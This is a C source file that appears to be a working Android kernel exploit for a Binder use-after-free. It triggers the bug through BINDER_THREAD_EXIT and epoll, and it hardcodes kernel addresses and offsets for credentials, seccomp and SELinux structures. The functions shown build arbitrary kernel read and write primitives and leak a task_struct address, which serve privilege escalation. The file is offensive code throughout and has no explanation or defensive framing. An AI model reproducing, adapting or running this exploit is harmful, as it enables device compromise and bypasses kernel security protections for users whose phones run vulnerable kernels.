#define _GNU_SOURCE
#include <err.h>
#include <fcntl.h>
#include <sched.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/epoll.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/uio.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 0x1000
#endif

#define BINDER_SET_MAX_THREADS 0x40046205ul
#define BINDER_THREAD_EXIT 0x40046208ul
#define DELAY_USEC 100000
#define IOV_SIZE 20
#define IOV_INDEX 10

#define TASK_stack 0x8
#define TASK_real_cred 0x610
#define TASK_cred 0x618
#define TASK_seccomp 0x6c0

#define THREAD_flags 0x0
#define THREAD_task 0x10

#define CRED_uid 0x4
#define CRED_user_ns 0x88
#define CRED_SIZE 168

#define ADDR_init_user_ns 0xffffff800a424b28
#define ADDR_ptmx_fops 0xffffff800a884780
#define ADDR_policydb 0xffffff800a80ce40
#define ADDR_current_mapping 0xffffff800a80d078
#define ADDR_current_mapping_size 0xffffff800a80d070
#define ADDR_kti_offset 0xffffff800a813b78

#define ADDR_avc_ss_reset 0xffffff80083e6df4

int fd, epfd;
int pipefd[2];
void *dummy_page;
int max_threads = 2;
struct epoll_event event = {.events = EPOLLIN};
struct iovec ioa[IOV_SIZE];
uint64_t offset = 0;

void initialize() {
	dummy_page = malloc(2 * PAGE_SIZE);
	if (!dummy_page)
		err(1, "malloc");

	fd = open("/dev/binder", O_RDONLY);
	if (!fd)
		err(1, "open /dev/binder");

	epfd = epoll_create(1000);
	if (!epfd)
		err(1, "epoll_create");

	signal(SIGCHLD, SIG_IGN);
}

void hexdump(uint8_t * buf, int size) {
	for (int offset = 0; offset < size; offset += 8) {
		uint64_t val = *(uint64_t *)(buf + offset);
		printf("%x, %lx\n", offset, val);
	}
}

size_t kernel_write_unstable(uint64_t kaddr, void *data, size_t len) {
	int sockfd[2];
	ioctl(fd, BINDER_SET_MAX_THREADS, &max_threads);

	if (epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &event))
		err(1, "epoll_add");

	memset(ioa, 0, sizeof(ioa));
	ioa[IOV_INDEX + 1].iov_base = dummy_page;
	ioa[IOV_INDEX + 1].iov_len = 1;
	ioa[IOV_INDEX + 2].iov_base = dummy_page;
	ioa[IOV_INDEX + 2].iov_len = 0x18;
	ioa[IOV_INDEX + 3].iov_base = 0;
	ioa[IOV_INDEX + 3].iov_len = len;

	socketpair(AF_UNIX, SOCK_STREAM, 0, sockfd);
	uint64_t buf[3];
	buf[1] = 0x18;
	buf[2] = kaddr;
	send(sockfd[1], buf, 1, 0);
	int pid = fork();
	if (pid == -1)
		err(1, "fork");
	if (pid == 0) {
		usleep(DELAY_USEC);
		epoll_ctl(epfd, EPOLL_CTL_DEL, fd, &event);
		send(sockfd[1], buf, 0x18, 0);
		send(sockfd[1], data, len, 0);
		exit(0);
	}
	close(sockfd[1]);
	ioctl(fd, BINDER_THREAD_EXIT, NULL);
	struct msghdr hdr = {.msg_iov=ioa, .msg_iovlen=IOV_SIZE};
	ssize_t bytes = recvmsg(sockfd[0], &hdr, MSG_WAITALL);
	close(sockfd[0]);
	return bytes - 0x19;
}

void kernel_write(uint64_t kaddr, void *data, size_t len) {
	int retry = 0;
	while(kernel_write_unstable(kaddr, data, len) != len) {
		if(++retry == 3)
			errx(1, "write failed");
	}
}

size_t kernel_read_unstable(uint64_t kaddr, void *data, size_t len) {
	ioctl(fd, BINDER_SET_MAX_THREADS, &max_threads);

	if (epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &event))
		err(1, "epoll_add");

	memset(ioa, 0, sizeof(ioa));
	ioa[IOV_INDEX + 1].iov_base = dummy_page;
	ioa[IOV_INDEX + 1].iov_len = PAGE_SIZE;
	ioa[IOV_INDEX + 2].iov_base = dummy_page;
	ioa[IOV_INDEX + 2].iov_len = 2 * PAGE_SIZE;
	ioa[IOV_INDEX + 3].iov_base = 0;
	ioa[IOV_INDEX + 3].iov_len = len;

	pipe(pipefd);
	fcntl(pipefd[0], F_SETPIPE_SZ, PAGE_SIZE);

	uint8_t buf[PAGE_SIZE];
	int pid = fork();
	if (pid == -1)
		err(1, "fork");
	if (pid == 0) {
		close(pipefd[1]);
		usleep(DELAY_USEC);
		epoll_ctl(epfd, EPOLL_CTL_DEL, fd, &event);
		read(pipefd[0], buf, sizeof(buf));
		read(pipefd[0], buf, sizeof(buf));
		uint64_t addr = *(uint64_t *)(buf);
		if (addr > 0xF000000000000000) {
			uint64_t w_chunk[] = {2 * PAGE_SIZE, kaddr, len};
			kernel_write(addr + 8, w_chunk, sizeof(w_chunk));
		}

		read(pipefd[0], buf, sizeof(buf));
		exit(0);
	}
	ioctl(fd, BINDER_THREAD_EXIT, NULL);
	ssize_t bytes = writev(pipefd[1], ioa, IOV_SIZE);
	close(pipefd[1]);
	read(pipefd[0], data, len);
	close(pipefd[0]);
	return bytes - 3 * PAGE_SIZE;
}

void kernel_read(uint64_t kaddr, void *data, size_t len) {
	int retry = 0;
	while(kernel_read_unstable(kaddr, data, len) != len) {
		if(++retry == 3)
			errx(1, "read failed");
	}
}

ssize_t leak_data(uint8_t *buf) {
	ioctl(fd, BINDER_SET_MAX_THREADS, &max_threads);

	if (epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &event))
		err(1, "epoll_add");

	memset(ioa, 0, sizeof(ioa));
	ioa[IOV_INDEX + 1].iov_base = dummy_page;
	ioa[IOV_INDEX + 1].iov_len = PAGE_SIZE;
	ioa[IOV_INDEX + 2].iov_base = dummy_page;
	ioa[IOV_INDEX + 2].iov_len = 2 * PAGE_SIZE;
	ioa[IOV_INDEX + 3].iov_base = 0;
	ioa[IOV_INDEX + 3].iov_len = PAGE_SIZE;

	pipe(pipefd);
	fcntl(pipefd[0], F_SETPIPE_SZ, PAGE_SIZE);

	int pid = fork();
	if (pid == -1)
		err(1, "fork");
	if (pid == 0) {
		close(pipefd[1]);
		usleep(DELAY_USEC);
		epoll_ctl(epfd, EPOLL_CTL_DEL, fd, &event);
		read(pipefd[0], buf, PAGE_SIZE);
		read(pipefd[0], buf, PAGE_SIZE);
		uint64_t addr = *(uint64_t *)(buf);
		if (addr > 0xF000000000000000) {
			uint64_t task_struct = *(uint64_t *)(buf + 0xE8);
			uint64_t data[] = {2 * PAGE_SIZE, task_struct, PAGE_SIZE};
			kernel_write(addr + 8, data, sizeof(data));
		}
		read(pipefd[0], buf, PAGE_SIZE);
		exit(0);
	}
	ioctl(fd, BINDER_THREAD_EXIT, NULL);
	ssize_t bytes = writev(pipefd[1], ioa, IOV_SIZE);
	close(pipefd[1]);
	read(pipefd[0], buf, PAGE_SIZE);
	close(pipefd[0]);
	return bytes - 3 * PAGE_SIZE;
}
